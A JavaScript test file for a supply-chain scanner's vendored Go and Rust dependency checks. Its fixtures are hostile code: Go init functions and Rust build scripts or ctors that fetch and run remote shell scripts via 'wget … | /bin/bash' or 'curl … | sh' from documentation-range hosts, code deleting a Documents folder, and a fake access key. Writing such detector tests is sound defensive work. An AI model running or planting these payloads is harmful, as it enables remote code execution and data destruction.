// --deps reads a Go project's vendor/ and a Rust project's `cargo vendor` tree (0.1.9, Part C): twin of
// python/tests/scanner/test_vendored_code.py (tests/architecture/test_js_parity.py compares the two CLIs on its trees).
// A vendor directory with a modules.txt holds the Go modules a build compiles, one whose crate directories hold a
// .cargo-checksum.json the crates; --deps reads them as the registry reads a module zip and a .crate: the file rules on
// each .go and .rs file a build compiles, the engine's Go reader on each module, its Rust reader on each crate (its
// Cargo.toml read by the engine). Without --deps both trees are pruned. Inert fragments: never built, documentation
// addresses (203.0.113.x).

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";
import { crateLayout } from "../src/deps.js";
import { vendorKind } from "../src/lib/fs.js";
import { cargoLayout, goVendoredModules } from "../src/lib/native.js";

const INIT_GO = 'package evil\n\nimport "os/exec"\n\nvar parts = []string{"wget", " -O - ", "https://203.0.113.7/a.sh", ' +
  '" | /bin/bash &"}\n\nfunc init() {\n\tcmd := parts[0] + parts[1] + parts[2] + parts[3]\n' +
  '\texec.Command("/bin/sh", "-c", cmd).Start()\n}\n';
const CLEAN_GO = 'package sub\n\nimport "strings"\n\nfunc Upper(s string) string { return strings.ToUpper(s) }\n';
const BUILD_RS = 'use std::process::Command;\n\nfn main() {\n    let url = format!("https://{}/{}", "203.0.113.9", "x.sh");\n' +
  '    Command::new("sh").arg("-c").arg(format!("curl -s {} | sh", url)).status().ok();\n}\n';
const CTOR_RS = '#[ctor::ctor]\nfn init() {\n    std::process::Command::new("sh").arg("-c").arg("curl -s https://203.0.113.9/s | sh").spawn().ok();\n}\n\npub fn f() {}\n';
const CLEAN_RS = "pub fn add(a: u32, b: u32) -> u32 { a + b }\n";
const BLOB = Buffer.from(Array.from({ length: 240 }, (_, i) => (i * 7919) % 256)).toString("base64");   // (G-5: real base64)
const MODULES_TXT = "# example.test/evil v1.0.0\n## explicit; go 1.21\nexample.test/evil\n" +
  "# example.test/ok v1.2.0\n## explicit\nexample.test/ok/sub\n";
const GO_PROJECT = { "go.mod": "module example.test/app\n\ngo 1.21\n", "main.go": "package main\n\nfunc main() {}\n",
  "vendor/modules.txt": MODULES_TXT };
const RUST_PROJECT = { "Cargo.toml": '[package]\nname = "app"\nversion = "0.1.0"\n', "src/main.rs": "fn main() {}\n" };

function crate(name, files, manifest = null) {
  const body = { ".cargo-checksum.json": '{"files":{},"package":"0"}',
    "Cargo.toml": manifest ?? `[package]\nname = "${name}"\nversion = "1.0.0"\n`, ...files };
  return Object.fromEntries(Object.entries(body).map(([rel, text]) => [`vendor/${name}/${rel}`, text]));
}

function tree(files) {
  const root = mkdtempSync(join(tmpdir(), "lz-vendor-"));
  for (const [rel, data] of Object.entries(files)) {
    const path = join(root, ...rel.split("/"));
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, data);
  }
  return root;
}

/** Every finding of a --deps scan of `files` (or without --deps): [rule, sev, file, line]. */
function scanAll(files, deps = true) {
  const root = tree(files);
  const out = mkdtempSync(join(tmpdir(), "lz-vendor-out-"));
  try {
    run(["check", root, "--out-dir", out, "--no-html", "--quiet", ...(deps ? ["--deps"] : [])], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    return rep.issues.map((i) => [i.rule, i.sev, i.file.replaceAll("\\", "/"), i.line]);
  } finally {
    rmSync(out, { recursive: true, force: true });
    rmSync(root, { recursive: true, force: true });
  }
}

function scan(files, deps = true) {
  return scanAll(files, deps).filter(([rule]) => rule.startsWith("SC-") || rule === "Q-SKIPPED-TREE");
}

test("Go: init code a vendored module runs, and the tree pruned without --deps", () => {
  const files = { ...GO_PROJECT, "vendor/example.test/evil/e.go": INIT_GO, "vendor/example.test/ok/sub/s.go": CLEAN_GO };
  assert.deepEqual(scan(files), [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/e.go", 9]]);
  assert.deepEqual(scan(files, false), [["Q-SKIPPED-TREE", "INFO", "vendor", 1]]);
});

test("Go: a module is read whole: init in one package reaching a function of another is start-up code", () => {
  const files = { ...GO_PROJECT,
    "vendor/example.test/evil/e.go": 'package evil\n\nimport "example.test/evil/helper"\n\nfunc init() {\n\thelper.Run()\n}\n',
    "vendor/example.test/evil/helper/h.go": 'package helper\n\nimport "os/exec"\n\nfunc Run() {\n\texec.Command("/bin/sh", ' +
      '"-c", "curl -s https://203.0.113.7/a.sh | sh").Start()\n}\n' };
  assert.deepEqual(scan(files), [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/helper/h.go", 6]]);
});

test("Go: what a build never compiles is not read; a file of no listed module is read with its package", () => {
  const bad = INIT_GO + `\nvar blob = "${BLOB}"\n`;
  for (const name of ["e_test.go", "_x.go", ".x.go"]) {
    assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/evil/ok.go": CLEAN_GO.replace("package sub", "package evil"),
      [`vendor/example.test/evil/${name}`]: bad }), [], name);
  }
  // (F-06's third round) a .go file in a testdata/ folder, or one named with "_" or "." first, is Go code only as a
  // package modules.txt lists: `go mod vendor` copies the files a package's //go:embed patterns match, .go files
  // below it too, and a build compiles only the packages it lists; another is data, as in the registry
  for (const folder of ["testdata", "testdata/fx", "_examples", ".hidden/x"]) {
    const path = `vendor/example.test/evil/${folder}/t.go`;
    const files = { ...GO_PROJECT, "vendor/example.test/evil/ok.go": CLEAN_GO.replace("package sub", "package evil"), [path]: bad };
    assert.deepEqual(scan(files), [], folder);
    files["vendor/modules.txt"] = MODULES_TXT.replace("example.test/evil\n", `example.test/evil\nexample.test/evil/${folder}\n`);
    assert.deepEqual(scan(files), [["SC-IMPORT-RISK", "CRITICAL", path, 9], ["SC-B64", "MAJOR", path, 12]], folder);
  }
  assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/other/x/e.go": INIT_GO.replace("package evil", "package x") }),
    [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/other/x/e.go", 9]]);
});

test("Go: a build constraint Go does not read as ignore leaves the file read (F-06); a test file ends in _test.go exactly", () => {
  // `//go:buildignore` and `// +buildignore` are comments to Go: white space must follow the prefix
  const bad = 'package evil\n\nimport "os"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n';
  for (const [header, read] of [["//go:buildignore\n\n", true], ["// +buildignore\n", true], ["// +build ignore\n", true],
    ["//go:build ignore || linux\n\n", true], ["//go:build ignore\n\n", false], ["// +build ignore\n\n", false]]) {
    const line = header.split("\n").length - 1 + 5;                                  // (the init's line)
    assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/evil/d.go": header + bad }),
      read ? [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/d.go", line]] : [], header);
  }
  assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/evil/e_TEST.go": INIT_GO }),
    [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/e_TEST.go", 9]]);
});

test("Go: a file is read as the Go toolchain reads its bytes; a module path holding testdata or vendor is read (F-06)", () => {
  // twin of test_vendored_code.py: a lone \r is no line end to Go, a second byte order mark is code to it, a \r in a
  // string is Go's; a file the parser refuses is SC-TRUNCATED, never left out; UTF-16's text is read by the rules as
  // before, and refused by Go and the reader
  const body = 'package evil\n\nimport "os"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n';
  const path = "vendor/example.test/evil/d.go";
  for (const data of ["// c\r//go:build ignore\n\n" + body, "// c\r// +build ignore\n\n" + body,
    "﻿﻿//go:build ignore\n\n" + body,
    'package evil\n\nimport "os"\n\nvar s = "a\rb"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n']) {
    assert.deepEqual(scan({ ...GO_PROJECT, [path]: data }).map(([r, , f]) => [r, f]), [["SC-IMPORT-RISK", path]], JSON.stringify(data));
  }
  for (const data of ["//go:build ignore\r\rpackage evil\r\r" + body.slice("package evil\n\n".length), "package evil\n\nfunc (\n"]) {
    assert.deepEqual(scan({ ...GO_PROJECT, [path]: data }).map(([r, , f]) => [r, f]), [["SC-TRUNCATED", path]]);
  }
  const token = 'const k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n';
  const text = "//go:build ignore\n\n" + body + token;
  for (const data of [Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(text, "utf16le")]),
    Buffer.from(text, "utf16le").swap16()]) {
    assert.deepEqual(scanAll({ ...GO_PROJECT, [path]: data }).filter(([r]) => ["S-TOKEN", "SC-TRUNCATED", "SC-IMPORT-RISK"].includes(r))
      .map(([r, , f, l]) => [r, f, l]), [["S-TOKEN", path, text.split("\n").length - 1]]);
  }
  // a lone \r: the reader's lines are the rules' (Go's line 1 holds the comments)
  const cr = 'package evil\n\n// one\r// two\r// three\n\nimport "os"\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" +
    '"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n';
  assert.deepEqual(Object.fromEntries(scanAll({ ...GO_PROJECT, [path]: cr }).filter(([r]) => ["S-TOKEN", "SC-IMPORT-RISK"].includes(r))
    .map(([r, , , l]) => [r, l])), { "S-TOKEN": 9, "SC-IMPORT-RISK": 11 });
  const bad = (pkg) => body.replace("package evil", `package ${pkg}`);
  const mods = "# example.test/testdata v1.0.0\n## explicit\nexample.test/testdata\n" +
    "# example.test/vendor v1.0.0\n## explicit\nexample.test/vendor\n# example.test/vd v1.0.0\n## explicit\nexample.test/vd\n" +
    "example.test/vd/vendor\n# example.test/td v1.0.0\n## explicit\nexample.test/td\nexample.test/td/testdata/x\n";
  const files = { ...GO_PROJECT, "vendor/modules.txt": mods, "vendor/example.test/testdata/t.go": bad("testdata"),
    "vendor/example.test/vendor/v.go": bad("vendor"), "vendor/example.test/vd/a.go": 'package vd\n\nimport _ "example.test/vd/vendor"\n',
    "vendor/example.test/vd/vendor/v.go": bad("vendor"),
    "vendor/example.test/td/lib.go": 'package td\n\nimport _ "example.test/td/testdata/x"\n',
    "vendor/example.test/td/testdata/x/x.go": bad("x") };
  assert.deepEqual(scan(files).map(([r, , f]) => [r, f]).sort(),
    [["SC-IMPORT-RISK", "vendor/example.test/td/testdata/x/x.go"], ["SC-IMPORT-RISK", "vendor/example.test/testdata/t.go"],
      ["SC-IMPORT-RISK", "vendor/example.test/vd/vendor/v.go"], ["SC-IMPORT-RISK", "vendor/example.test/vendor/v.go"]]);
});

test("Go: a testdata package modules.txt lists is read; an unlisted one is data (F-06)", () => {
  // twin of test_vendored_code.py (the review's appx and app-1.21)
  const mods = "# example.test/ta v1.0.0\n## explicit; go 1.21\nexample.test/ta/testdata/x\n" +
    "# example.test/tb v1.0.0\n## explicit; go 1.21\nexample.test/tb\n";
  const x = 'package x\n\nimport "os"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n';
  const token = 'package fx\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n';
  const files = { ...GO_PROJECT, "vendor/modules.txt": mods, "vendor/example.test/ta/testdata/x/x.go": x,
    "vendor/example.test/ta/testdata/fx/f.go": token,
    "vendor/example.test/tb/tb.go": 'package tb\n\nimport _ "example.test/ta/testdata/x"\n' };
  assert.deepEqual(scan(files), [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/ta/testdata/x/x.go", 5]]);
  assert.deepEqual(scanAll(files).filter(([r]) => r.startsWith("S-")), []);
  // a modules.txt that lists no package: every file is read
  files["vendor/modules.txt"] = "garbage\n## nonsense\nexample.test/ta/testdata/x\n";
  assert.ok(scanAll(files).some(([r, , f]) => r === "S-TOKEN" && f === "vendor/example.test/ta/testdata/fx/f.go"));
  // a refused file in a `_` folder modules.txt does not list is data; listed, it holds the module
  const tmpl = { ...GO_PROJECT, "vendor/example.test/evil/_tmpl/t.go": "package {{.Name}}\n\nfunc F() {}\n",
    "vendor/example.test/evil/ok.go": CLEAN_GO.replace("package sub", "package evil") };
  assert.deepEqual(scan(tmpl), []);
  tmpl["vendor/modules.txt"] = MODULES_TXT.replace("example.test/evil\n", "example.test/evil\nexample.test/evil/_tmpl\n");
  assert.deepEqual(scan(tmpl), [["SC-TRUNCATED", "CRITICAL", "vendor/example.test/evil/_tmpl/t.go", 1]]);
});

test("Go: an unlisted folder an import names is code (F-06's fourth round)", () => {
  // twin of test_vendored_code.py (the review's appv-tamper): a main module below `go 1.23` builds a vendored package
  // modules.txt does not list when an import names it
  const x = (pkg) => `package ${pkg}\n\nimport "os"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n`;
  const files = { ...GO_PROJECT,
    "vendor/example.test/evil/evil.go": 'package evil\n\nimport (\n\t_ "example.test/evil/testdata/td"\n\t_ "example.test/evil/\\x5fu"\n)\n',
    "vendor/example.test/evil/testdata/td/td.go": 'package td\n\nimport _ "example.test/evil/.hidden/h"\n',
    "vendor/example.test/evil/.hidden/h/h.go": x("h"), "vendor/example.test/evil/_u/u.go": x("u"),
    "vendor/example.test/evil/_m/m.go": x("m"), "vendor/example.test/evil/_quiet/q.go": x("q"),
    "main.go": 'package main\n\nimport _ "example.test/evil/_m"\n\nfunc main() {}\n' };
  assert.deepEqual(scan(files).filter(([r]) => r === "SC-IMPORT-RISK").map(([, , f]) => f).sort(),
    ["vendor/example.test/evil/.hidden/h/h.go", "vendor/example.test/evil/_m/m.go", "vendor/example.test/evil/_u/u.go"]);
  assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/evil/ok.go": CLEAN_GO.replace("package sub", "package evil"),
    "vendor/example.test/evil/gen.go": '//go:build ignore\n\npackage evil\n\nimport _ "example.test/evil/_u"\n',
    "vendor/example.test/evil/_u/u.go": x("u") }), []);
  // (the review's appv-refmain: a file the parser refuses may import any of them, so every unlisted folder is code)
  const found = scan({ ...GO_PROJECT, "vendor/example.test/evil/ok.go": CLEAN_GO.replace("package sub", "package evil"),
    "vendor/example.test/evil/_u/u.go": x("u"),
    "main.go": 'package main\n\nimport _ "example.test/evil/_u"\n\nfunc main() {}\n\nfunc (\n' }).map(([r, , f]) => `${r} ${f}`);
  assert.ok(found.includes("SC-IMPORT-RISK vendor/example.test/evil/_u/u.go"), found.join("; "));
});

test("Rust: a build script, the manifest's own, and none when it says false", () => {
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("buildevil", { "build.rs": BUILD_RS, "src/lib.rs": CLEAN_RS }),
    ...crate("fine", { "src/lib.rs": CLEAN_RS }) }), [["SC-INSTALL-HOOK", "CRITICAL", "vendor/buildevil/build.rs", 5]]);
  const custom = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = "tools/gen.rs"\n';
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "tools/gen.rs": BUILD_RS, "src/lib.rs": CLEAN_RS }, custom) })
    .map(([r, , f]) => [r, f]), [["SC-INSTALL-HOOK", "vendor/c/tools/gen.rs"]]);
  const off = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = false\n';
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "build.rs": BUILD_RS, "src/lib.rs": CLEAN_RS }, off) }), []);
});

test("Rust: a ctor; tests, benches and examples not read; a vendor directory that is not cargo's", () => {
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CTOR_RS }) }),
    [["SC-IMPORT-RISK", "CRITICAL", "vendor/c/src/lib.rs", 3]]);
  for (const name of ["tests/t.rs", "benches/b.rs", "examples/e.rs"]) {
    assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CLEAN_RS, [name]: CTOR_RS + `pub const K: &str = "${BLOB}";\n` }) }), [], name);
  }
  assert.deepEqual(scan({ ...RUST_PROJECT, "vendor/y/src/lib.rs": CLEAN_RS + `pub const K: &str = "${BLOB}";\n` }, false),
    [["SC-B64", "MAJOR", "vendor/y/src/lib.rs", 2]]);
});

test("Rust: a vendored crate's test items are left out of the file rules (N-20)", () => {
  const tests = `#[cfg(test)]\nmod tests {\n    const V: &str = "${BLOB}";\n}\n`;
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CLEAN_RS + tests }) }), []);
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CLEAN_RS + tests + `pub const K: &str = "${BLOB}";\n` }) }),
    [["SC-B64", "MAJOR", "vendor/c/src/lib.rs", 6]]);
});

test("the helpers: a vendor tree's kind, what is never built, a manifest's layout", () => {
  const root = tree({ "go/vendor/modules.txt": "", "cargo/vendor/c/.cargo-checksum.json": "{}", "plain/vendor/y/x.rs": "",
    "elsewhere.json": "{}" });
  try {
    assert.equal(vendorKind(Buffer.from(join(root, "go", "vendor"))), "go");
    assert.equal(vendorKind(Buffer.from(join(root, "cargo", "vendor"))), "cargo");
    assert.equal(vendorKind(Buffer.from(join(root, "plain", "vendor"))), null);
    let linked = true;
    mkdirSync(join(root, "link", "vendor", "y"), { recursive: true });
    try { symlinkSync(join(root, "elsewhere.json"), join(root, "link", "vendor", "y", ".cargo-checksum.json")); } catch { linked = false; }
    if (linked) assert.equal(vendorKind(Buffer.from(join(root, "link", "vendor"))), null);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
  // (never_built: the engine's, collect.rs and its tests)
  assert.deepEqual(cargoLayout('[package]\nbuild = false\n[lib]\npath = "l.rs"\n'), { build: false, lib: "l.rs", proc_macro: null });
  assert.deepEqual(goVendoredModules(MODULES_TXT), ["example.test/evil", "example.test/ok"]);
  const members = ["build.rs", "tools/gen.rs", "src/lib.rs", "src/x.rs"];
  assert.deepEqual(crateLayout('lib = { path = "./src/x.rs", proc-macro = true }\npackage.build = "tools/gen.rs"\n', members),
    ["tools/gen.rs", "src/x.rs", true]);
  assert.deepEqual(crateLayout("", members), ["build.rs", "src/lib.rs", false]);
  assert.deepEqual(crateLayout('[lib]\npath = "../x.rs"\n', members), ["build.rs", null, false]);
});
